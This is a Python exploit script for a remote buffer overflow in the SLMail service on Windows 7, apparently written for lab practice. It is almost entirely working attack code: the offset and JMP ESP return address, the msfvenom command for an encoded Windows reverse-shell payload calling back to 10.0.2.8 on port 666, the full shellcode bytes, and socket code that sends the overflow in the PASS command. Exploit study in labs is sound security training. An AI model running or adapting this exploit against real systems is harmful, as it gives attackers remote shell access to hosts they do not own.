#!/usr/bin/python
# SLMail Remote Buffer Overflow Exploit
# Written by Douglas Berdeaux, 2019 WeakNet Labs, Demon Linux
# Target - Windows 7
# ASLR/REBASE/SAFESEH FALSE - SLMFC.DLL

import socket as so # for the Socket object
import sys # for exit() and arguments
### User Input:
server=sys.argv[1] # the IP address a sthe first argument
port=int(sys.argv[2]) # the port # as the second argument
bufflen=int(sys.argv[3]) # send to me the buffer length to fuzz.

## App Specifics:
badBytes="\x00\x0a\x0d" # found each one.
# modules to use: -Openc32.dll-(0 pointers), -SLMail.exe-(NULL in addr), SLMFC.dll (19 pointers)
# SLMFC.dll: 0x5f4a358f
jmpEsp = "\x8f\x35\x4a\x5f"

## Payload:
#msfvenom --platform=windows --payload=windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=666 --bad-chars='\x00\x0a\x0d' -e x86/shikata_ga_nai --arch=x86 -f python

#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1684 bytes
buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x58\xbb\xb0\xab\xa1\xe6\x2b"
buf += "\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x58\x57\x43"
buf += "\x13\x64\x40\x06\xdc\x94\x91\x67\x54\x71\xa0\xa7\x02"
buf += "\xf2\x93\x17\x40\x56\x18\xd3\x04\x42\xab\x91\x80\x65"
buf += "\x1c\x1f\xf7\x48\x9d\x0c\xcb\xcb\x1d\x4f\x18\x2b\x1f"
buf += "\x80\x6d\x2a\x58\xfd\x9c\x7e\x31\x89\x33\x6e\x36\xc7"
buf += "\x8f\x05\x04\xc9\x97\xfa\xdd\xe8\xb6\xad\x56\xb3\x18"
buf += "\x4c\xba\xcf\x10\x56\xdf\xea\xeb\xed\x2b\x80\xed\x27"
buf += "\x62\x69\x41\x06\x4a\x98\x9b\x4f\x6d\x43\xee\xb9\x8d"
buf += "\xfe\xe9\x7e\xef\x24\x7f\x64\x57\xae\x27\x40\x69\x63"
buf += "\xb1\x03\x65\xc8\xb5\x4b\x6a\xcf\x1a\xe0\x96\x44\x9d"
buf += "\x26\x1f\x1e\xba\xe2\x7b\xc4\xa3\xb3\x21\xab\xdc\xa3"
buf += "\x89\x14\x79\xa8\x24\x40\xf0\xf3\x20\xa5\x39\x0b\xb1"
buf += "\xa1\x4a\x78\x83\x6e\xe1\x16\xaf\xe7\x2f\xe1\xd0\xdd"
buf += "\x88\x7d\x2f\xde\xe8\x54\xf4\x8a\xb8\xce\xdd\xb2\x52"
buf += "\x0e\xe1\x66\xf4\x5e\x4d\xd9\xb5\x0e\x2d\x89\x5d\x44"
buf += "\xa2\xf6\x7e\x67\x68\x9f\x15\x92\xfb\xaa\xe9\x9e\xf3"
buf += "\xc2\xeb\x9e\x01\x89\x65\x78\x6f\xbd\x23\xd3\x18\x24"
buf += "\x6e\xaf\xb9\xa9\xa4\xca\xfa\x22\x4b\x2b\xb4\xc2\x26"
buf += "\x3f\x21\x23\x7d\x1d\xe4\x3c\xab\x09\x6a\xae\x30\xc9"
buf += "\xe5\xd3\xee\x9e\xa2\x22\xe7\x4a\x5f\x1c\x51\x68\xa2"
buf += "\xf8\x9a\x28\x79\x39\x24\xb1\x0c\x05\x02\xa1\xc8\x86"
buf += "\x0e\x95\x84\xd0\xd8\x43\x63\x8b\xaa\x3d\x3d\x60\x65"
buf += "\xa9\xb8\x4a\xb6\xaf\xc4\x86\x40\x4f\x74\x7f\x15\x70"
buf += "\xb9\x17\x91\x09\xa7\x87\x5e\xc0\x63\xb7\x14\x48\xc5"
buf += "\x50\xf1\x19\x57\x3d\x02\xf4\x94\x38\x81\xfc\x64\xbf"
buf += "\x99\x75\x60\xfb\x1d\x66\x18\x94\xcb\x88\x8f\x95\xd9"

### Globals:
eipRetAddr = "" # or just jmpEsp
buffer = "PASS " + "A" * 2606 + jmpEsp + "\x90" * (bufflen-4-2606-len(buf)) + buf
print "[*] bufflen: " + str(len(buffer))

# Create a Socket object, called "s"
print "[*] Making conenction to SLMail service."
s=so.socket(so.AF_INET,so.SOCK_STREAM)
s.connect((server,port))

print "[*] Sending user info to Mail service."
s.send("User admin\r\n")
s.recv(1024)

print "[*] Attempting to send payload to service."
s.send(buffer + '\r\n') # send a carriage return and newline also
s.recv(1024)

s.send("QUIT\r\n") # quit the Mail service.
print "[*] Script completed."
